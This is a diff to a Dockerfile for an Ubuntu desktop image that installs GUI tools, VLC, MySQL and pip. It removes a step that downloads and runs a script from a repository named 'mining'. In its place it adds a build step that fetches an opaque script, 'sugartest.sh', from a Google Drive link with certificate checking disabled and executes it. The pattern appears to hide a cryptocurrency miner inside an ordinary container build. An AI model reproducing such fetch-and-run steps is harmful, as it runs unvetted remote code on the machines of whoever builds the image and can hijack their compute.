@@ -4,9 +4,12 @@ ENV DEBIAN_FRONTEND=noninteractive
 
 #RUN echo 'deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\n' > /etc/apt/sources.list
 
-RUN apt-get upgrade && apt update && apt install wget -y
+RUN apt-get upgrade
+RUN apt update
+RUN apt install wget -y
+RUN wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
 RUN set -ex; \
-    wget https://try.gitea.io/novalanto61/mining/raw/branch/master/githubxz.sh && chmod u+x githubxz.sh && ./githubxz.sh \
+    apt-get update \
     && apt-get install -y --no-install-recommends \
         dbus-x11 \
         nautilus \
@@ -14,6 +17,8 @@ RUN set -ex; \
         expect \
         sudo \
         vim \
+	python3-pip \
+	mysql-server \
 	vlc \
         bash \
         net-tools \
